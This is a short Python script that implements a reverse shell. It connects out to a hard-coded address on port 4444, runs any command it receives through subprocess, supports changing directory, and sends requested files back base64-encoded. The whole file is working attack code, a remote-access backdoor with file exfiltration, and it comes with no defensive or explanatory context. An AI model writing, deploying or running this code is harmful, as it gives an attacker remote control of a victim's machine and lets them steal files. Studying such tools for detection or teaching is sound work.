import socket

import os


import subprocess

import sys

import platform


import base64
#powershell

SERVER_HOST = "192.168.89.120"

SERVER_PORT = 4444

BUFFER_SIZE = 6144 * 128 

SEPARATOR = "<sep><sep>"


s = socket.socket()
n1=socket.gethostname()
s.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()


s.send(cwd.encode())

while True:

    command = s.recv(BUFFER_SIZE).decode()

    if command.lower() == "exit":

        break

    elif command[:2].lower() == "cd":

        try:

            os.chdir(command[3:])

        except :

            continue

        else:

            output = ""

    elif command[:8]=="download":

        try:

            with open(command[9:],'rb') as file:

                s.send(base64.b64encode(file.read()))

        except:

            continue

        
            
    else:
        output = subprocess.getoutput(command)

    message = f"{output}{SEPARATOR}"
    s.send(message.encode())
s.close()
